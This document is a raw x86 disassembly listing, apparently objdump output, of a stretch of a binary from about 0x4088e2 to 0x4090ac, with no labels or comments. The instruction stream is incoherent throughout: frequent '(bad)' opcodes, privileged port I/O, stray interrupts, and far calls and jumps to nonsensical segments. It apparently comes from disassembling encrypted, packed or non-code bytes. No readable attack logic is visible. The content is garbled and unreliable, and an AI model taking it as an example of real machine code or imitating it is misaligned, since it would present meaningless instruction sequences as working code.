  4088e2:	rcr    BYTE PTR [ecx-0x5a],0x12
  4088e6:	ins    BYTE PTR es:[di],dx
  4088e8:	push   0x57
  4088ea:	lods   eax,DWORD PTR ds:[esi]
  4088eb:	or     DWORD PTR [edi+edi*8-0x39],esi
  4088ef:	and    BYTE PTR [esi+eiz*1+0x21174166],bh
  4088f6:	inc    edx
  4088f7:	xor    esp,DWORD PTR [edx+edx*8+0x56abcf61]
  4088fe:	(bad)  
  408900:	enter  0x5499,0x64
  408904:	mov    ebx,0xc456a6bb
  408909:	adc    DWORD PTR [esi+0x7b],esi
  40890c:	out    dx,al
  40890d:	dec    edx
  40890e:	mov    ds:0x759fb757,eax
  408913:	rcl    BYTE PTR [ebp+0x36],1
  408916:	(bad)  
  408917:	(bad)
  40891a:	cwde   
  40891b:	mov    edi,0xf2636ad8
  408920:	cs add ebp,0xd4e1f0b2
  408927:	mov    eax,0xd8b0adc6
  40892c:	xlat   BYTE PTR ds:[ebx]
  40892d:	iret   
  40892e:	test   eax,0x9b3730fc
  408933:	cld    
  408934:	jae    0x408921
  408936:	add    eax,0xf40cd6bf
  40893b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40893c:	add    eax,0x16910f0c
  408941:	and    DWORD PTR [esi],edi
  408943:	shl    esp,0xd7
  408946:	ret    
  408947:	test   eax,0x565ddf54
  40894c:	(bad)
  40894f:	sbb    al,0x4
  408951:	int3   
  408952:	popa   
  408953:	mov    al,0x74
  408955:	or     eax,0xfdaa2e28
  40895a:	and    al,0x32
  40895c:	int    0xcb
  40895e:	inc    ebx
  40895f:	scas   al,BYTE PTR es:[edi]
  408960:	lea    edx,[ebx+0x2142de6f]
  408966:	sbb    eax,DWORD PTR [ebp+0x75bf0478]
  40896c:	out    0xd4,eax
  40896e:	mov    WORD PTR [edi+ebx*1],ds
  408971:	mov    esi,0x9ee53d4e
  408976:	dec    esp
  408977:	sub    eax,0xe5bc55b4
  40897c:	daa    
  40897d:	xor    dl,BYTE PTR [edx-0x310b8305]
  408983:	mov    eax,0x694b88dd
  408988:	push   edi
  408989:	cmc    
  40898a:	in     eax,0x0
  40898c:	les    ecx,FWORD PTR [edx+eiz*8-0x4e8966f6]
  408993:	sbb    eax,0x16d9b292
  408998:	mov    BYTE PTR [eax-0x41],ah
  40899b:	xor    ebp,DWORD PTR [ecx]
  40899d:	jbe    0x4089f4
  40899f:	out    0x3e,al
  4089a1:	sub    al,0x3
  4089a3:	in     eax,dx
  4089a4:	and    BYTE PTR [edx],cl
  4089a6:	add    al,0xc8
  4089a8:	mov    dh,0x9e
  4089aa:	(bad)  
  4089ab:	and    DWORD PTR [ebp+ebp*4+0x50b6b71b],esi
  4089b2:	neg    dh
  4089b4:	loope  0x4089f1
  4089b6:	aaa    
  4089b7:	pminub mm3,QWORD PTR [edi]
  4089ba:	dec    ebp
  4089bb:	je     0x408956
  4089bd:	repnz add DWORD PTR [edi+0x6ff4f1c9],edi
  4089c4:	fld    QWORD PTR [ecx+0x25]
  4089c7:	lods   al,BYTE PTR ds:[esi]
  4089c8:	jp     0x4089db
  4089ca:	lea    eax,[esi-0x642b021c]
  4089d0:	inc    ecx
  4089d1:	retf   0x2205
  4089d4:	adc    BYTE PTR [ebx-0x7adb333a],ah
  4089da:	pop    esp
  4089db:	aam    0x36
  4089dd:	adc    ebx,DWORD PTR [ecx+0x6fc10e20]
  4089e3:	adc    dl,BYTE PTR [ebx-0xd4ace12]
  4089e9:	mov    esi,esp
  4089eb:	into   
  4089ec:	jno    0x408a13
  4089ee:	mov    ds:0xb7815cbd,al
  4089f3:	push   edx
  4089f4:	das    
  4089f5:	cmp    al,0xb1
  4089f7:	call   0x87ff:0x66871254
  4089fe:	mov    ebp,0x3567022a
  408a03:	add    DWORD PTR [edi+ecx*1],ebp
  408a06:	clc    
  408a07:	addr16 jns 0x408a01
  408a0a:	xor    ebp,DWORD PTR [esi-0x25a7aff8]
  408a10:	dec    edx
  408a11:	inc    edi
  408a12:	test   al,0x2
  408a14:	int    0x53
  408a16:	retf   
  408a17:	inc    esp
  408a18:	loop   0x4089a8
  408a1a:	(bad)  
  408a1b:	jmp    0x4089f5
  408a1d:	mov    ah,0xdf
  408a1f:	addr16 xchg ecx,eax
  408a21:	or     edi,0xbae34f5b
  408a27:	in     eax,0x7a
  408a29:	pop    ebp
  408a2a:	lds    esp,FWORD PTR [ebx]
  408a2c:	retf   0x41f9
  408a2f:	int    0xf9
  408a31:	and    dh,bh
  408a33:	adc    ecx,esp
  408a35:	scas   eax,DWORD PTR es:[edi]
  408a36:	inc    ecx
  408a37:	lods   al,BYTE PTR ds:[esi]
  408a38:	retf   
  408a39:	outs   dx,DWORD PTR ds:[esi]
  408a3a:	test   DWORD PTR [ebp-0x54f8569b],eax
  408a40:	adc    DWORD PTR [ebx],edi
  408a42:	pop    es
  408a43:	sub    eax,0x74637cd8
  408a48:	repz imul esp,DWORD PTR [ecx-0x4d],0xfffffff1
  408a4d:	shl    BYTE PTR [esp+eiz*4],0xf4
  408a51:	xlat   BYTE PTR ds:[ebx]
  408a52:	xor    BYTE PTR [ebp-0x69],dh
  408a55:	fld    QWORD PTR [edx-0x1bed71a7]
  408a5b:	inc    eax
  408a5c:	cli    
  408a5d:	fdiv   QWORD PTR [ecx]
  408a5f:	icebp  
  408a60:	fdiv   QWORD PTR [edi+0x5d]
  408a63:	js     0x408a45
  408a65:	into   
  408a66:	mov    al,ds:0x8ceaea92
  408a6b:	adc    al,BYTE PTR [ecx]
  408a6d:	mov    bl,0x96
  408a6f:	push   esp
  408a70:	mov    bl,0x49
  408a72:	pop    ecx
  408a73:	rol    bh,cl
  408a75:	mov    edx,DWORD PTR [ecx+0x35]
  408a78:	inc    ebp
  408a79:	std    
  408a7a:	iret   
  408a7b:	retf   
  408a7c:	pop    DWORD PTR [edi+0x56fc386]
  408a82:	push   ecx
  408a83:	adc    BYTE PTR [edi-0x65],ch
  408a86:	jmp    DWORD PTR [esi+0x17208c64]
  408a8c:	inc    ebp
  408a8d:	mov    bh,BYTE PTR ds:0x80aefdc5
  408a93:	rcl    DWORD PTR [eax],0x30
  408a96:	clc    
  408a97:	fadd   QWORD PTR [edi+0x6d]
  408a9a:	push   esp
  408a9b:	xchg   esp,eax
  408a9c:	js     0x408b11
  408a9e:	(bad)  
  408a9f:	lahf   
  408aa0:	or     DWORD PTR [eax],edx
  408aa2:	sbb    DWORD PTR [esi+0x6ded1ae7],ebx
  408aa8:	dec    edi
  408aa9:	(bad)  [edx-0x37]
  408aac:	clc    
  408aad:	aas    
  408aae:	dec    ecx
  408aaf:	sub    eax,0x2855f6d2
  408ab4:	in     eax,dx
  408ab5:	in     eax,0x46
  408ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ab8:	fbld   TBYTE PTR [ebp+0x71]
  408abb:	pusha  
  408abc:	add    eax,0xa0bd54
  408ac1:	retf   
  408ac2:	(bad)  
  408ac3:	inc    eax
  408ac4:	lods   al,BYTE PTR ds:[esi]
  408ac5:	adc    ebp,DWORD PTR [ecx-0xb]
  408ac8:	mov    ebx,0x4fc9b7dc
  408acd:	push   ebx
  408ace:	icebp  
  408acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad0:	mov    bh,BYTE PTR [edi-0x7]
  408ad3:	ins    DWORD PTR es:[edi],dx
  408ad4:	adc    eax,0xc7e8e1fa
  408ad9:	sahf   
  408ada:	aaa    
  408adb:	mov    ah,0xac
  408add:	adc    DWORD PTR [edi-0x446bfe27],0xffffffb8
  408ae4:	sbb    al,0x6c
  408ae6:	xlat   BYTE PTR ds:[ebx]
  408ae7:	in     al,0xac
  408ae9:	retf   0x56d6
  408aec:	scas   al,BYTE PTR es:[edi]
  408aed:	jle    0x408b26
  408aef:	pop    esi
  408af0:	jmp    0x33b9:0x927a5b62
  408af7:	ds jnp 0x408ae2
  408afa:	lea    esp,[edx]
  408afc:	xor    ebp,edi
  408afe:	inc    eax
  408aff:	xor    eax,0x2898aef1
  408b04:	scas   al,BYTE PTR es:[edi]
  408b05:	cmc    
  408b06:	and    edi,DWORD PTR ds:0xa1cf1097
  408b0c:	add    eax,0xa07989b2
  408b11:	pop    ebx
  408b12:	bound  eax,QWORD PTR [esi+0x62d2c54]
  408b18:	shr    DWORD PTR [esi],cl
  408b1a:	iret   
  408b1b:	pop    esi
  408b1c:	(bad)  
  408b1d:	out    0xae,al
  408b1f:	hlt    
  408b20:	or     dl,BYTE PTR [edx+edx*1-0x27]
  408b24:	or     eax,0xb3eadb4d
  408b29:	in     al,0x7f
  408b2b:	lock inc edi
  408b2d:	add    edx,esp
  408b2f:	cwde   
  408b30:	inc    eax
  408b31:	cmp    esi,DWORD PTR [esi-0x26e356e9]
  408b37:	cmp    eax,0x899d8d62
  408b3c:	jle    0x408b5e
  408b3e:	loopne 0x408af8
  408b40:	jns    0x408afa
  408b42:	scas   eax,DWORD PTR es:[edi]
  408b43:	test   eax,0x5cee2489
  408b48:	dec    esi
  408b49:	je     0x408b91
  408b4b:	cmp    al,0xc0
  408b4d:	add    BYTE PTR [ebx-0x57],dh
  408b50:	xchg   cl,al
  408b52:	xchg   esp,eax
  408b53:	mov    es,WORD PTR [edi+edi*8-0x4fe608da]
  408b5a:	lods   eax,DWORD PTR ds:[esi]
  408b5b:	aas    
  408b5c:	sbb    DWORD PTR [esi-0x6064282],edx
  408b62:	jmp    0x408b10
  408b64:	or     DWORD PTR [edx+0x48],esp
  408b67:	(bad)  
  408b68:	pushf  
  408b69:	xchg   edi,eax
  408b6a:	(bad)  
  408b6b:	jmp    0x3af57ac6
  408b70:	mov    ah,0xbc
  408b72:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  408b74:	dec    esp
  408b75:	popa   
  408b76:	in     eax,dx
  408b77:	adc    bl,BYTE PTR [edi]
  408b79:	push   ecx
  408b7a:	sbb    dh,BYTE PTR [edi]
  408b7c:	out    0x45,eax
  408b7e:	je     0x408b8d
  408b80:	pop    esp
  408b81:	ret    
  408b82:	adc    eax,0x374256f4
  408b87:	lds    edx,FWORD PTR [esi+ebp*2+0x4ea22b23]
  408b8e:	sbb    cl,BYTE PTR [ebp-0x95f98c2]
  408b94:	jne    0x408c0b
  408b96:	cli    
  408b97:	or     al,0x29
  408b99:	jecxz  0x408bd6
  408b9b:	jns    0x408ba4
  408b9d:	call   0xc6b76575
  408ba2:	fld    TBYTE PTR [edi+0x4a]
  408ba5:	push   edi
  408ba6:	je     0xd5063a25
  408bac:	jae    0x408b9d
  408bae:	mov    dl,0x17
  408bb0:	fadd   DWORD PTR [edi-0x65740134]
  408bb6:	mov    ah,0x45
  408bb8:	scas   eax,DWORD PTR es:[edi]
  408bb9:	in     eax,dx
  408bba:	and    eax,0x61758a53
  408bbf:	lock or cl,ch
  408bc2:	sub    eax,0xb0b4f936
  408bc7:	out    dx,al
  408bc8:	rcr    eax,0xf6
  408bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bcc:	xchg   ebp,eax
  408bcd:	lock imul edx,DWORD PTR [ecx+0x7d16079d],0xffffffa6
  408bd5:	imul   esi,edx,0xffffff8c
  408bd8:	(bad)  
  408bd9:	fadd   st,st(3)
  408bdb:	add    DWORD PTR [edx],eax
  408bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bde:	ds dec esp
  408be0:	push   ss
  408be1:	iret   
  408be2:	leave  
  408be3:	or     esp,DWORD PTR [edx+esi*1]
  408be6:	xchg   bx,ax
  408be8:	fcmovbe st,st(1)
  408bea:	inc    edi
  408beb:	mov    al,0x87
  408bed:	(bad)  
  408bee:	mov    esi,ss
  408bf0:	or     eax,0x215f5aa8
  408bf5:	in     eax,0x36
  408bf7:	sub    eax,0x8135454d
  408bfc:	or     eax,0x32bc149b
  408c01:	mov    ecx,0x70737aca
  408c06:	and    DWORD PTR [ebx-0xf],ecx
  408c09:	shl    ebp,1
  408c0b:	pop    esi
  408c0c:	lods   al,BYTE PTR ds:[esi]
  408c0d:	xor    edx,DWORD PTR [ebp+ebp*1-0x6e]
  408c11:	daa    
  408c12:	inc    ebx
  408c13:	mov    ecx,0xf71dce3a
  408c18:	mov    esp,0x4914457c
  408c1d:	pop    esp
  408c1e:	je     0x408ba5
  408c20:	xlat   BYTE PTR ds:[ebx]
  408c21:	(bad)  
  408c22:	jae    0x408bdf
  408c24:	es dec ebx
  408c26:	addr16 or bl,al
  408c29:	fldenv [ebx]
  408c2b:	stos   BYTE PTR es:[edi],al
  408c2c:	mov    WORD PTR [ebx+0x5d],ds
  408c2f:	mov    ds:0x99aa0db7,al
  408c34:	inc    ecx
  408c35:	popa   
  408c36:	and    al,0x95
  408c38:	bound  ecx,QWORD PTR [edx]
  408c3a:	(bad)  
  408c3b:	es add eax,0x63cf4005
  408c41:	imul   esp
  408c43:	inc    esi
  408c44:	inc    eax
  408c45:	lods   al,BYTE PTR ds:[esi]
  408c46:	xchg   ebp,eax
  408c47:	pop    esp
  408c48:	sub    al,0x3c
  408c4a:	or     eax,0x3f464cec
  408c4f:	repnz push ecx
  408c51:	shl    cl,0x7e
  408c54:	jbe    0x408be6
  408c56:	cmp    BYTE PTR [edi+0x3f61951c],ch
  408c5c:	inc    ebx
  408c5d:	dec    ebp
  408c5e:	lds    ebp,FWORD PTR [ebx-0x1f]
  408c61:	mov    ebp,0x5f6e8639
  408c66:	mov    ds:0x8f121a4a,al
  408c6b:	neg    DWORD PTR [ebx]
  408c6d:	repz pop esi
  408c6f:	test   ah,bl
  408c71:	imul   ebp,DWORD PTR [ebp-0x43],0xffffffc0
  408c75:	cwde   
  408c76:	mov    ah,0xe
  408c78:	push   ds
  408c79:	and    DWORD PTR es:[edx+0x7d],0xd2c0dd97
  408c81:	mov    ds:0x8cac3f5b,eax
  408c86:	repz cmp eax,0xa1fb641b
  408c8c:	and    edi,DWORD PTR [edx]
  408c8e:	pop    edx
  408c8f:	bnd jne 0x408c8e
  408c92:	jae    0x408ce5
  408c94:	dec    edx
  408c95:	ret    
  408c96:	sbb    eax,0x7f0aaf29
  408c9b:	(bad)  
  408c9c:	and    DWORD PTR [edx+0x40],ebx
  408c9f:	jbe    0x408c9c
  408ca1:	push   ss
  408ca2:	push   ecx
  408ca3:	fsubr  DWORD PTR [esi+0x362e62f4]
  408ca9:	sbb    ebx,DWORD PTR [esi]
  408cab:	popf   
  408cac:	xchg   bh,dh
  408cae:	sbb    esi,DWORD PTR [edx]
  408cb0:	test   BYTE PTR [edi],ch
  408cb2:	sti    
  408cb3:	mov    ds:0x224c809b,al
  408cb8:	fs pop ebx
  408cba:	shl    DWORD PTR [esi+edx*1-0x2897005b],cl
  408cc1:	inc    edi
  408cc2:	cdq    
  408cc3:	sbb    esp,DWORD PTR [ebx+0x6d]
  408cc6:	rcr    BYTE PTR [edi+0x13f4173f],0x7c
  408ccd:	mov    edi,0x3af30c77
  408cd2:	mov    esi,ebx
  408cd4:	fcomp  QWORD PTR [esi+0x25f9c35c]
  408cda:	cmp    BYTE PTR [ebp+edi*8-0x7b7a3963],ah
  408ce1:	fcomp  st(4)
  408ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ce4:	or     al,0x99
  408ce6:	cmp    ecx,DWORD PTR [ebp+eax*1+0x541549e4]
  408ced:	rcr    esp,1
  408cef:	in     al,0xa7
  408cf1:	in     eax,0xf2
  408cf3:	mov    edi,0x92f982cf
  408cf8:	rcr    DWORD PTR [ebp+eax*4-0x6f],0x19
  408cfd:	lea    edx,[esi-0x6c]
  408d00:	xchg   ebp,eax
  408d01:	jl     0x408d40
  408d03:	jnp    0x408d82
  408d05:	mov    edi,0xcabcdda6
  408d0a:	ins    BYTE PTR es:[edi],dx
  408d0b:	mov    al,0xa1
  408d0d:	jl     0x408d0d
  408d0f:	lock pop edi
  408d11:	inc    ecx
  408d12:	sub    edi,esi
  408d14:	aad    0xb2
  408d16:	cmp    al,0x9f
  408d18:	sub    dl,BYTE PTR [ecx+0x9029f26]
  408d1e:	fwait
  408d1f:	mov    esp,ecx
  408d21:	jno    0x408d4a
  408d23:	push   edx
  408d24:	aam    0xf0
  408d26:	arpl   si,bx
  408d28:	or     bh,BYTE PTR [edi]
  408d2a:	inc    ebp
  408d2b:	popa   
  408d2c:	add    BYTE PTR [edx-0x6c],al
  408d2f:	cmp    bl,BYTE PTR [edx+ecx*2]
  408d32:	fstp   QWORD PTR [edx+edx*4+0x7cf8b963]
  408d39:	rol    BYTE PTR [ecx+ebp*1],0x10
  408d3d:	dec    edx
  408d3e:	mov    al,0xf5
  408d40:	gs in  eax,0xcf
  408d43:	mov    ds:0x6cdeb368,eax
  408d48:	jmp    0x408daf
  408d4a:	add    cl,bh
  408d4c:	push   ecx
  408d4d:	ret    
  408d4e:	mov    edi,0xb3f4940e
  408d53:	sub    BYTE PTR [ecx],0x39
  408d56:	xor    al,0xf1
  408d58:	sub    eax,DWORD PTR [eax+0x7554a735]
  408d5e:	dec    ebp
  408d5f:	stos   BYTE PTR es:[edi],al
  408d60:	into   
  408d61:	popf   
  408d62:	(bad)  
  408d63:	pushf  
  408d64:	xor    esi,esp
  408d66:	lock pop ebp
  408d68:	out    0xf8,al
  408d6a:	arpl   WORD PTR [eax],bp
  408d6c:	lea    eax,[edi+0x6b]
  408d6f:	ds mov bl,0xcf
  408d72:	ror    DWORD PTR [ecx-0x1e],0x2c
  408d76:	dec    eax
  408d77:	int    0xcd
  408d79:	push   ds
  408d7a:	pop    edi
  408d7b:	loope  0x408d50
  408d7d:	(bad)  
  408d7e:	cmp    dh,BYTE PTR [ebx+0x3f69f70e]
  408d84:	jg     0x408db0
  408d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d87:	mov    esi,0x640e44b0
  408d8c:	and    eax,0x5af1d188
  408d91:	std    
  408d92:	stc    
  408d93:	add    eax,0xc1ed4f96
  408d98:	xchg   edi,eax
  408d99:	repz mov edx,0xc239d8ef
  408d9f:	xor    bh,BYTE PTR [ebx-0x1e49af31]
  408da5:	xor    eax,0x21554fb5
  408daa:	xchg   edi,eax
  408dab:	mov    dl,0xa7
  408dad:	popf   
  408dae:	and    BYTE PTR [ebx],dl
  408db0:	rcr    DWORD PTR [esi+edi*4+0xeceab90],cl
  408db7:	mov    dl,0x66
  408db9:	and    BYTE PTR [ecx],0xb2
  408dbc:	and    eax,0x7d4bafe7
  408dc1:	jae    0x408da5
  408dc3:	or     ecx,eax
  408dc5:	jmp    0xf257827b
  408dca:	out    0x22,eax
  408dcc:	adc    ecx,DWORD PTR [ecx+0x4177b2e3]
  408dd2:	xor    al,0x21
  408dd4:	or     al,0x3c
  408dd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dd7:	xchg   DWORD PTR [ebx-0x6ae369d7],esi
  408ddd:	sahf   
  408dde:	cmp    ch,BYTE PTR [ebp+0x3a]
  408de1:	pop    edx
  408de2:	dec    esp
  408de3:	mov    eax,gs:0x6008f828
  408de9:	add    al,0x3a
  408deb:	dec    ebx
  408dec:	or     esp,DWORD PTR [edi+0x23]
  408def:	lahf   
  408df0:	mov    edi,0xaef793ff
  408df5:	mov    al,0xdf
  408df7:	mov    ecx,0x992295f3
  408dfc:	lods   eax,DWORD PTR ds:[esi]
  408dfd:	stos   BYTE PTR es:[edi],al
  408dfe:	lea    ebx,[esi-0x6386a0e3]
  408e04:	je     0x408dff
  408e06:	xchg   DWORD PTR [edi],esi
  408e08:	(bad)  
  408e09:	jbe    0x408e12
  408e0b:	jmp    DWORD PTR [esi-0x46207d44]
  408e11:	pop    ebx
  408e12:	popa   
  408e13:	loop   0x408e1d
  408e15:	div    BYTE PTR [eax]
  408e17:	es ret 
  408e19:	pop    es
  408e1a:	in     al,dx
  408e1b:	popa   
  408e1c:	les    esp,FWORD PTR [edx-0x5850899c]
  408e22:	adc    edx,ecx
  408e24:	push   ecx
  408e25:	lods   eax,DWORD PTR ds:[esi]
  408e26:	sti    
  408e27:	js     0x408e11
  408e29:	lods   al,BYTE PTR ds:[esi]
  408e2a:	(bad)  
  408e2b:	dec    edi
  408e2c:	inc    eax
  408e2d:	inc    esi
  408e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e2f:	or     eax,DWORD PTR [esi-0x5]
  408e32:	adc    ecx,edi
  408e34:	or     ebx,edx
  408e36:	mov    cl,0xf
  408e38:	out    dx,eax
  408e39:	ja     0x408e06
  408e3b:	xor    dl,BYTE PTR [ecx]
  408e3d:	fild   QWORD PTR [esi-0x2c]
  408e40:	iret   
  408e41:	jae    0x408e35
  408e43:	test   BYTE PTR [edi+0x11],cl
  408e46:	mov    DWORD PTR [edx+0x451e3be],ebp
  408e4c:	mov    bl,0x56
  408e4e:	fadd   DWORD PTR [ebx+0x3c]
  408e51:	sub    ecx,eax
  408e53:	xor    ebx,DWORD PTR [edx]
  408e55:	outs   dx,BYTE PTR ds:[esi]
  408e56:	fs mov cl,0xdf
  408e59:	dec    esp
  408e5a:	call   0x28f8cd6b
  408e5f:	xor    BYTE PTR [ebx+0xadc84f8],bh
  408e65:	fstp   st(6)
  408e67:	mov    dl,0xa
  408e69:	jb     0x408eb3
  408e6b:	add    BYTE PTR [edi],dh
  408e6d:	stos   BYTE PTR es:[edi],al
  408e6e:	loopne 0x408e64
  408e70:	popa   
  408e71:	mov    ax,0x6ea6
  408e75:	xlat   BYTE PTR ds:[ebx]
  408e76:	js     0x408e3f
  408e78:	mov    esi,0x9d331642
  408e7d:	in     al,dx
  408e7e:	mov    BYTE PTR [edi],bh
  408e80:	pop    ebx
  408e81:	cmc    
  408e82:	(bad)  
  408e83:	(bad)  
  408e84:	mov    cl,0x5f
  408e86:	call   0xf847:0x85eef027
  408e8d:	shl    DWORD PTR [ebx+0x7e0806d0],0x69
  408e94:	push   ebx
  408e95:	scas   al,BYTE PTR es:[edi]
  408e96:	aas    
  408e97:	mov    al,ds:0x46e86921
  408e9c:	(bad)  
  408e9d:	into   
  408e9e:	loop   0x408e84
  408ea0:	(bad)  
  408ea2:	ja     0x408edc
  408ea4:	push   edi
  408ea5:	fwait
  408ea6:	popa   
  408ea7:	adc    dl,0x83
  408eaa:	sub    bl,BYTE PTR [edx+edi*4-0xe8fbf78]
  408eb1:	pop    edx
  408eb2:	fiadd  WORD PTR [esi+edx*4-0x1acd1b]
  408eb9:	ins    DWORD PTR es:[edi],dx
  408eba:	add    edx,esp
  408ebc:	cdq    
  408ebd:	(bad)  
  408ebe:	in     al,0x1e
  408ec0:	lods   al,BYTE PTR ds:[esi]
  408ec1:	cmp    ebx,edx
  408ec3:	leave  
  408ec4:	push   ds
  408ec5:	xchg   edi,edx
  408ec7:	adc    ebx,DWORD PTR [ebx]
  408ec9:	fnstenv [esp+edi*1-0xe3ffb39]
  408ed0:	cdq    
  408ed1:	ret    0xf7ed
  408ed4:	loopne 0x408eb8
  408ed6:	jae    0x408ebc
  408ed8:	add    BYTE PTR [ebx],ch
  408eda:	loope  0x408f11
  408edc:	pop    es
  408edd:	pop    ds
  408ede:	mov    eax,ds:0x14b1bd87
  408ee3:	xor    ch,BYTE PTR [esi+0x6db54a37]
  408ee9:	pop    es
  408eea:	lea    ecx,[esi+0x20]
  408eed:	pop    ecx
  408eee:	lahf   
  408eef:	mov    ch,0xa5
  408ef1:	fisub  DWORD PTR [edx]
  408ef3:	(bad)  
  408ef4:	fsub   QWORD PTR [ebp-0x341cad52]
  408efa:	push   ss
  408efb:	xor    edi,DWORD PTR [edi-0x25]
  408efe:	mov    bh,0x71
  408f00:	xchg   ebp,eax
  408f01:	popf   
  408f02:	daa    
  408f03:	js     0x408ef2
  408f05:	mov    eax,0xb3d9eff1
  408f0a:	sbb    esp,DWORD PTR [edi-0x58]
  408f0d:	in     al,dx
  408f0e:	test   esi,ebp
  408f10:	or     BYTE PTR [esi+0x27dbd96e],dl
  408f16:	mov    BYTE PTR [eax],bh
  408f18:	xchg   DWORD PTR ds:0x6695302e,ebx
  408f1e:	jae    0x408f1f
  408f20:	repz mov dh,0x31
  408f23:	and    edx,0xfffffff4
  408f26:	mov    ecx,0xe1adfeae
  408f2b:	push   DWORD PTR [ecx-0x76c737d5]
  408f31:	fs mov ch,0xcf
  408f34:	test   al,0x7b
  408f36:	test   eax,0x236c84af
  408f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f3c:	inc    ebp
  408f3d:	inc    esp
  408f3e:	adc    DWORD PTR [esi+edx*1+0x5d],ecx
  408f42:	hlt    
  408f43:	mov    eax,eax
  408f45:	(bad)  
  408f46:	(bad)  
  408f47:	mov    edi,0x86b705a6
  408f4c:	loop   0x408eda
  408f4e:	scas   eax,DWORD PTR es:[edi]
  408f4f:	sbb    ebx,DWORD PTR [ecx]
  408f51:	mov    al,ds:0xf2e708bc
  408f56:	loop   0x408f1d
  408f58:	test   eax,0x2d779515
  408f5d:	or     al,0x73
  408f5f:	cld    
  408f60:	jecxz  0x408f7f
  408f62:	mov    ecx,0xca2dbce7
  408f67:	stc    
  408f68:	add    ch,BYTE PTR ds:0xa63656bf
  408f6e:	cmp    DWORD PTR [esp+ecx*1-0x6212a52b],ebx
  408f75:	fisub  DWORD PTR [edx+0x22265303]
  408f7b:	jecxz  0x408f56
  408f7d:	jbe    0x408f46
  408f7f:	jmp    0x408fad
  408f81:	call   0x1ba0:0xc28c0a4d
  408f88:	test   eax,0xf9a72e8c
  408f8d:	jo     0x408fbd
  408f8f:	pop    ebp
  408f90:	mov    al,0xa
  408f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f93:	and    BYTE PTR [edx+edi*2-0x26],bh
  408f97:	stc    
  408f98:	fidiv  DWORD PTR [edx-0x5da51a95]
  408f9e:	sub    BYTE PTR [edi-0x63d6508a],dh
  408fa4:	mov    BYTE PTR [edi],ch
  408fa6:	daa    
  408fa7:	xchg   DWORD PTR [edx],ebp
  408fa9:	(bad)  
  408faa:	mov    esp,edx
  408fac:	stos   DWORD PTR es:[edi],eax
  408fad:	lea    ecx,[ebx-0x7e]
  408fb0:	loop   0x409023
  408fb2:	jmp    0xa850f266
  408fb7:	outs   dx,BYTE PTR ds:[esi]
  408fb8:	mov    esi,0x580e0625
  408fbd:	ins    DWORD PTR es:[edi],dx
  408fbe:	cmp    DWORD PTR [esi+0x5f],edi
  408fc1:	jg     0x408fda
  408fc3:	jnp    0x408fcb
  408fc5:	lea    esi,[ebx+esi*8+0xec7e6c4]
  408fcc:	ds loop 0x408faf
  408fcf:	mov    ecx,0x6beef690
  408fd4:	pushf  
  408fd5:	pusha  
  408fd6:	je     0x408fc0
  408fd8:	dec    ebp
  408fd9:	sti    
  408fda:	int    0x76
  408fdc:	mov    al,ds:0xccec4a46
  408fe1:	mov    dl,0x4f
  408fe3:	cmp    ecx,ecx
  408fe5:	mov    al,ds:0x591a24c5
  408fea:	mov    ebp,0xb984ce52
  408fef:	ins    DWORD PTR es:[edi],dx
  408ff0:	add    ch,bh
  408ff2:	sub    DWORD PTR [edx],esp
  408ff4:	cmp    eax,DWORD PTR [edx-0x6]
  408ff7:	inc    ebp
  408ff8:	jge    0x40902c
  408ffa:	mov    al,0x77
  408ffc:	neg    DWORD PTR [edi-0x7a]
  408fff:	inc    ebp
  409000:	lods   eax,DWORD PTR ds:[esi]
  409001:	outs   dx,BYTE PTR ds:[esi]
  409002:	and    edx,0x16d288de
  409008:	shr    ch,1
  40900a:	cmp    edx,ecx
  40900c:	jmp    0x95965556
  409011:	cmp    al,0xc
  409013:	mov    al,0xd7
  409015:	cs cmp eax,0x6f2cac7
  40901b:	push   eax
  40901c:	sbb    eax,0xc1a9be16
  409021:	or     eax,0xe7193484
  409026:	int3   
  409027:	push   ebp
  409028:	inc    ebp
  409029:	add    ecx,ebp
  40902b:	fs sbb al,0x3b
  40902e:	and    eax,0xd196ff9d
  409033:	jnp    0x409030
  409035:	push   ebp
  409036:	test   DWORD PTR [esi+0x4d665f95],edi
  40903c:	fwait
  40903d:	mov    ebp,0xcf0e722d
  409042:	xor    ecx,ebx
  409044:	jg     0x408feb
  409046:	inc    esp
  409047:	aad    0x97
  409049:	stos   BYTE PTR es:[edi],al
  40904a:	(bad)
  40904d:	test   esi,ebx
  40904f:	add    bh,BYTE PTR [ebx]
  409051:	loopne 0x408ff2
  409053:	or     al,0xd0
  409055:	ins    BYTE PTR es:[edi],dx
  409056:	push   0xffffffbd
  409058:	out    0x21,al
  40905a:	(bad)  
  40905b:	lea    ecx,[bx+di+0x1c]
  40905f:	mov    ch,0xba
  409061:	scas   eax,DWORD PTR es:[edi]
  409062:	fidivr WORD PTR [eax+eiz*1+0x1916df00]
  409069:	ret    0x1ca
  40906c:	mov    al,0xee
  40906e:	dec    eax
  40906f:	pop    edx
  409070:	xchg   ebp,eax
  409071:	pop    es
  409072:	fs dec eax
  409074:	fld    QWORD PTR [edi]
  409076:	or     BYTE PTR [edi],bh
  409078:	add    BYTE PTR [edi+0x706e6c23],ah
  40907e:	outs   dx,BYTE PTR ds:[esi]
  40907f:	fcom   DWORD PTR [edx]
  409081:	sbb    DWORD PTR [ebp+eax*8-0x2b564561],0xffffffd4
  409089:	loopne 0x409081
  40908b:	xor    bh,BYTE PTR [edx+ebp*8]
  40908e:	mov    esp,0x30f8dc78
  409093:	(bad)
  409096:	dec    esp
  409097:	rcl    edi,0x67
  40909a:	adc    DWORD PTR [ebx-0x24],ebp
  40909d:	or     DWORD PTR [ecx],edi
  40909f:	inc    ecx
  4090a0:	mov    ss,WORD PTR [edi-0x2b3ba31d]
  4090a6:	xchg   edi,eax
  4090a7:	test   eax,0xaf446851
  4090ac:	call   0x6a9017c6
